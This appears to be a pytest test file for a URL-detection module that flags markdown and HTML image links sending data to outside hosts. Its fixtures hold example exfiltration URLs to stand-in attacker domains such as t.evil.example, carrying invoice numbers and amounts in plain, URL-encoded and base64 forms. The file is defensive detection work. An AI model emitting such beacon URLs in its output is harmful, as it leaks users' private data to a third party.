import base64
from urllib.parse import quote

import pytest

from lure.tools.urls import (
    IMAGE,
    LINK,
    FoundUrl,
    allowed,
    carried,
    find_urls,
    host,
    outside_carrying,
)


def kinds(text):
    return [(u.url, u.kind) for u in find_urls(text)]


def test_markdown_image_and_link():
    text = ("Summary.\n![status](https://badges.evil.example/b.png?d=INV-1 \"badge\")\n"
            "See [the portal](https://portal.vendor.example/x).")
    assert kinds(text) == [("https://badges.evil.example/b.png?d=INV-1", IMAGE),
                           ("https://portal.vendor.example/x", LINK)]


@pytest.mark.parametrize("text", [
    "![a][logo]\n\n[logo]: https://cdn.evil.example/p.png?q=1",
    "![logo][]\n\n[logo]: <https://cdn.evil.example/p.png?q=1>",
    "![logo]\n\n[Logo]: https://cdn.evil.example/p.png?q=1 \"title\"",
])
def test_reference_style_images(text):
    assert kinds(text) == [("https://cdn.evil.example/p.png?q=1", IMAGE)]


def test_html_img_and_anchor():
    text = '<img alt="x" src="https://t.evil.example/p.gif?d=1"> <a href=\'https://a.example/y\'>y</a>'
    assert kinds(text) == [("https://t.evil.example/p.gif?d=1", IMAGE),
                           ("https://a.example/y", LINK)]


def test_bare_urls_drop_trailing_punctuation():
    text = "Open https://a.example/x?y=1. Or (see https://b.example/z)."
    assert kinds(text) == [("https://a.example/x?y=1", LINK), ("https://b.example/z", LINK)]


def test_image_wins_over_link_and_duplicates_collapse():
    url = "https://t.evil.example/p.png"
    assert kinds(f"![x]({url}) and again {url}") == [(url, IMAGE)]


def test_scheme_relative_and_non_http():
    assert kinds("![x](//t.evil.example/a.png) [m](mailto:a@b.example) [f](ftp://f.example/x)") \
        == [("https://t.evil.example/a.png", IMAGE)]


def test_no_urls():
    assert find_urls("") == [] and find_urls(None) == [] and find_urls("plain text") == []


@pytest.mark.parametrize("url,expected", [
    ("https://Evil.Example:8443/x", "evil.example"),
    ("https://user@evil.example/x", "evil.example"),
    ("https://evil.example?d=1", "evil.example"),
    ("not a url", ""),
])
def test_host(url, expected):
    assert host(url) == expected


def test_allowed_matches_subdomains_only():
    assert allowed("portal.harbor-paper.example", ["harbor-paper.example"])
    assert not allowed("harbor-paper.example.evil.example", ["harbor-paper.example"])
    assert not allowed("eviharbor-paper.example", ["harbor-paper.example"])
    assert not allowed("", ["corp.example"])


@pytest.mark.parametrize("encode", [
    lambda s: s,
    lambda s: quote(s),
    lambda s: quote(quote(s)),
    lambda s: s.replace(" ", "+"),
    lambda s: base64.b64encode(s.encode()).decode(),
    lambda s: base64.urlsafe_b64encode(s.encode()).decode().rstrip("="),
    lambda s: quote(base64.b64encode(s.encode()).decode()),
])
def test_carried_through_encodings(encode):
    data = "INV-20931 4,812.50 due Nov 3"
    url = "https://t.evil.example/p.png?d=" + encode(data)
    assert carried(url, ["INV-20931", "4,812.50", "absent"]) == ["INV-20931", "4,812.50"]


def test_outside_carrying_filters_kind_domain_and_data():
    urls = [FoundUrl("https://t.evil.example/p.png?d=INV-1", IMAGE),
            FoundUrl("https://t.evil.example/p.png?d=none", IMAGE),
            FoundUrl("https://portal.vendor.example/?d=INV-1", IMAGE),
            FoundUrl("https://l.evil.example/?d=INV-1", LINK)]
    hits = outside_carrying(urls, ["vendor.example"], ["INV-1"], render=IMAGE)
    assert [h["url"] for h in hits] == ["https://t.evil.example/p.png?d=INV-1"]
    assert hits[0]["carries"] == ["INV-1"] and hits[0]["host"] == "t.evil.example"
    beacons = outside_carrying(urls, ["vendor.example"], None)
    assert len(beacons) == 3


def test_carried_ignores_thousands_separators():
    url = "https://t.evil.example/p.png?d=" + quote("INV-1 4812.50 and 1,618.25")
    assert carried(url, ["4,812.50", "1618.25", "5,130.00"]) == ["4,812.50", "1618.25"]
